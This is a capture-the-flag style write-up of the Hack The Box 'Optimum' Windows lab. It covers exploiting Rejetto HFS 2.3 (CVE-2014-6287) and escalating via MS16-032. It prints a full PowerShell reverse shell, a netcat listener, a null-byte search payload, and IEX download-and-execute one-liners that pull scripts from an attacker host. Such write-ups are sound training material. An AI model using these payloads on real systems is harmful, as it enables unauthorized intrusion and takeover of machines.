---
title: HTB — Optimum
type: lab-writeup
platform: HTB
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-28
tags:
  - foundational
  - lab
  - HTB
  - windows
  - HFS
  - CVE-2014-6287
  - rejetto
  - privilege-escalation
  - MS16-032
---

# HTB — Optimum

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Optimum |
| Difficulty | Easy-Medium |
| OS | Windows Server 2012 R2 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-28 |

> **Summary:** Rejetto HTTP File Server (HFS) 2.3 is vulnerable to remote code execution via CVE-2014-6287. Initial shell as user, then privilege escalation via MS16-032 (secondary logon handle) to SYSTEM.

---

## Objectives

- [x] Recon: identify HFS web service
- [x] Exploit: CVE-2014-6287 for initial foothold
- [x] Priv esc: MS16-032 to SYSTEM

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -oN nmap/optimum_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80/tcp | http | HttpFileServer httpd 2.3 (Rejetto) |

### Web Enumeration

- Browsing `http://<IP>` shows Rejetto HFS 2.3 interface
- Server header confirms: `HFS 2.3`
- Search functionality present — key indicator for CVE-2014-6287

---

## Vulnerability Background

**CVE-2014-6287 — Rejetto HFS Remote Code Execution**

Rejetto HTTP File Server versions before 2.3c are vulnerable to RCE through a null-byte injection in the search parameter. The server uses a scripting macro language that evaluates user input, allowing arbitrary command execution.

| Field | Detail |
|---|---|
| CVE | CVE-2014-6287 |
| Weakness | CWE-94: Improper Control of Generation of Code |
| Impact | Remote code execution as the user running HFS |
| CVSS | 9.8 (Critical) |
| Fix | Upgrade to HFS 2.3c or later |

---

## Foothold

### Exploit with Metasploit

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <MACHINE_IP>
set LHOST <YOUR_IP>
set LPORT 4444
run
```

### Manual Exploit (Without Metasploit)

```bash
# 1. Host a PowerShell reverse shell script via Python HTTP server
# Create shell.ps1:
$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}

# 2. Serve it
python3 -m http.server 8080

# 3. Start listener
nc -lvnp 4444

# 4. Trigger RCE via search parameter (URL-encoded)
# The vulnerable parameter uses %00 null byte to break out of regex
curl "http://<MACHINE_IP>/?search=%00{.exec|C%3a\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http://<YOUR_IP>:8080/shell.ps1').}"
```

Shell connects as user `kostas`.

---

## Privilege Escalation

### System Enumeration

```powershell
systeminfo
# Windows Server 2012 R2 Standard — 6.3 Build 9600
# No hotfixes installed → highly likely vulnerable to kernel exploits

whoami /priv
# Standard user privileges
```

### Identify Vulnerability

```bash
# Check with Windows Exploit Suggester
python windows-exploit-suggester.py --database 2026-03-28-mssb.xls --systeminfo sysinfo.txt
# Or use Sherlock.ps1 on target
```

Key finding: **MS16-032** — Secondary Logon Handle Privilege Escalation. Affects Windows Server 2012 R2 when no patches applied.

### MS16-032 Exploitation

```powershell
# On target — download and execute MS16-032 PowerShell exploit
# Host Invoke-MS16032.ps1 (Empire/PowerShell Empire version) on attacker
IEX(New-Object Net.WebClient).downloadString('http://<YOUR_IP>:8080/Invoke-MS16032.ps1')
Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).downloadString('http://<YOUR_IP>:8080/shell2.ps1')"
```

> **Note:** Use the 64-bit PowerShell path (`SysNative`) if initial shell is 32-bit. MS16-032 requires a multi-core system (fails on single-core VMs).

New shell connects as `NT AUTHORITY\SYSTEM`.

---

## Post-Exploitation

### Flags

| Flag | Location |
|---|---|
| User | `C:\Users\kostas\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Key Takeaways

- Rejetto HFS is a common CTF/HTB target — always check version for CVE-2014-6287
- Windows Server 2012 R2 without patches is vulnerable to multiple kernel exploits
- MS16-032 exploits a race condition in the Secondary Logon service — requires multi-core
- Always check architecture (32-bit vs 64-bit) — use `SysNative` path for 64-bit PowerShell from a 32-bit process
- `systeminfo` with no hotfixes = kernel exploit territory

---

## Tools Used

- Nmap
- Metasploit (or manual exploit)
- Netcat
- Windows Exploit Suggester / Sherlock

---

## References

- [Hack The Box — Optimum](https://app.hackthebox.com/machines/Optimum)
- [CVE-2014-6287 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)
- [MS16-032 — Microsoft](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)

---
*Write-up completed: 2026-03-28*

## See Also

- Penetration-Testing-Methodology
- Windows-Privilege-Escalation
- Nmap
- Common-Ports
- Reverse-Shell-Cheatsheet
---
<- [[Labs-MOC]]